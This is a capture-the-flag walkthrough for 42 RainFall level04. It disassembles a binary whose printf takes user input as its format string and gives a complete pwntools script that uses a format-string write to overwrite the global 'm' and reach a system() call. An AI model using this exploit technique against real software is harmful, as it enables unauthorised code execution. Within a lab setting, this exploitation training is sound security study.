---
title: 42 RainFall Level04 - Walkthrough 🚀
tags:
  - cyber-security
  - rainfall
  - assembly
  - ctf
  - format-string
  - vulnerability
  - fmt-string
categories:
  - ctfs
  - 42project
date: 2025-02-26 13:22:02
---

# Welcome to RainFall

![rainfall](/images/rainfall.jpg)

# 🌊 Level04 of Rainfall Project 🌊

## 🔍 Introduction

Hello, today I'm gonna show you the level04 of rainfall, Well, is pretty much the same level as the level 03.
So the report will be rather short, although an exploit written with pwntools is provided.

### 💻 Objdump Analysis

We can run the following command, To disassemble the binary with the intel assembly syntax.

```sh
$ objdump -d ./level4 -M intel
```

Once it's done, the output will be like that

```asm
08048444 <p>:
 8048444:	55                   	push   ebp
 8048445:	89 e5                	mov    ebp,esp
 8048447:	83 ec 18             	sub    esp,0x18
 804844a:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
 804844d:	89 04 24             	mov    DWORD PTR [esp],eax
 8048450:	e8 eb fe ff ff       	call   8048340 <printf@plt>
 8048455:	c9                   	leave
 8048456:	c3                   	ret

08048457 <n>:
 8048457:	55                   	push   ebp
 8048458:	89 e5                	mov    ebp,esp
 804845a:	81 ec 18 02 00 00    	sub    esp,0x218
 8048460:	a1 04 98 04 08       	mov    eax,ds:0x8049804
 8048465:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 8048469:	c7 44 24 04 00 02 00 	mov    DWORD PTR [esp+0x4],0x200
 8048470:	00 
 8048471:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 8048477:	89 04 24             	mov    DWORD PTR [esp],eax
 804847a:	e8 d1 fe ff ff       	call   8048350 <fgets@plt>
 804847f:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 8048485:	89 04 24             	mov    DWORD PTR [esp],eax
 8048488:	e8 b7 ff ff ff       	call   8048444 <p>
 804848d:	a1 10 98 04 08       	mov    eax,ds:0x8049810
 8048492:	3d 44 55 02 01       	cmp    eax,0x1025544
 8048497:	75 0c                	jne    80484a5 <n+0x4e>
 8048499:	c7 04 24 90 85 04 08 	mov    DWORD PTR [esp],0x8048590
 80484a0:	e8 bb fe ff ff       	call   8048360 <system@plt>
 80484a5:	c9                   	leave
 80484a6:	c3                   	ret

080484a7 <main>:
 80484a7:	55                   	push   ebp
 80484a8:	89 e5                	mov    ebp,esp
 80484aa:	83 e4 f0             	and    esp,0xfffffff0
 80484ad:	e8 a5 ff ff ff       	call   8048457 <n>
 80484b2:	c9                   	leave
 80484b3:	c3                   	ret
```

So, as you can see we have three functions named respectively `main`, `n` and `p` and the vulnerability is present in `p` function.

You can see, the main function call `n` function and in `n` function a call to `fgets@plt` is performed and buffer is allocated like the previous level, and read on STDIN.

So we have an entry input user of `0x200` or 512 bytes in decimal, So we have also talk in last previous level about calling convention, remember in x86-32 bits the argument is passed through the stack in LIFO order.

So to resume, In the `n` function we can see that it calls the `p` function and if we look a little closer at the `p` function
we can see that the first parameter is directly the first argument, which shows that `printf`
has no constant parameter, so if we throw the binary and write `%x` 4 times for example, we can read on the stack as on the previous level

Now, if we look at the n function just after the `p` function call, we see that an address from the Data segment `ds:` is written to the eax register.
The `eax` register is then compared with the value `0x1025544`

if the condition is triggered then the zero flag is set, we execute the system function with the cat command at address `0x08048590` as the first parameter

with the following command we can look at the addresses corresponding to the symbol in the binary

we note that the address compared with the value in the `eax` register is in fact the symbol `m`

so we'll have to write to the location of the `m` symbol we can now create our payload directly with `pwntools`

### 🤓 Python Exploit 


```python
#!/usr/bin/python3
#coding: utf-8
#usage: python3 script.py -l ./level4
#documentation: https://docs.pwntools.com/en/dev/fmtstr.html

import sys

try:
    from pwn import *
except ImportError as err:
    print(err)
    sys.exit(1)

class LoadBinary:

    def __init__(self, binary, mode):
        context.update(arch='i386', os='linux')

        self.filename = binary
        self.elf = ELF(binary)
        if mode == "-l":
            self.p = process(binary)
        elif mode == "-r":
            self.client = ssh("level4", '192.168.42.72', port=4242, password="XXXX")
            self.p = self.client.process('./level4')
        else:
            print("Invalid options dude !")

    def run(self):
        m_addr = self.elf.symbols['m']
        print('[+] Overwrite m at {} with {}'.format(hex(m_addr), hex(0x1025544)))

        payload = fmtstr_payload(12, {m_addr: 0x1025544})
        self.p.sendline(payload)
        self.p.interactive()
        self.p.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit(1)
    LoadBinary(sys.argv[2], sys.argv[1]).run()
```
